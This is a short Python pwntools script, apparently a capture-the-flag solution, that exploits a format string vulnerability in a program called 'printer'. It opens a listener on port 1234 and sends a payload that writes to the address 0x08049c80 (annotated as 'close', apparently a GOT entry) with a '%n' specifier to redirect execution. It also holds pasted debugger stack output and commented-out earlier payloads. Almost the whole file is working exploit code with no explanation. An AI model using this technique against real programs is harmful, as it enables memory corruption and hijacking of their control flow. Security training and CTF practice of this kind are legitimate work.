#format string vulnerability in printer
from pwn import *

l = listen(1234, "0.0.0.0")
c = l.wait_for_connection()
#08049c80 close
#l.sendline("\x80\x9c\x04\x08%134514787u%7\$n")
#addr = "\xc0\x85\x04\x08"
#0x8049c80 close
addr = "\x80\x9c\x04\x08"
#addr = "AAAA"
"""
0 0000| 0xffffb360 --> 0xffffb37c ("AAAA%0$n%p%p%p%p")
1 0004| 0xffffb364 --> 0xffffb37c ("AAAA%0$n%p%p%p%p")
2 0008| 0xffffb368 --> 0x2000 ('')
3 0012| 0xffffb36c --> 0x0
4 0016| 0xffffb370 --> 0x0
5 0020| 0xffffb374 --> 0x0
6 0024| 0xffffb378 --> 0x0
7 0028| 0xffffb37c ("AAAA%0$n%p%p%p%p")
"""

l.send(addr + "%134514787u%7$n")
l.close()
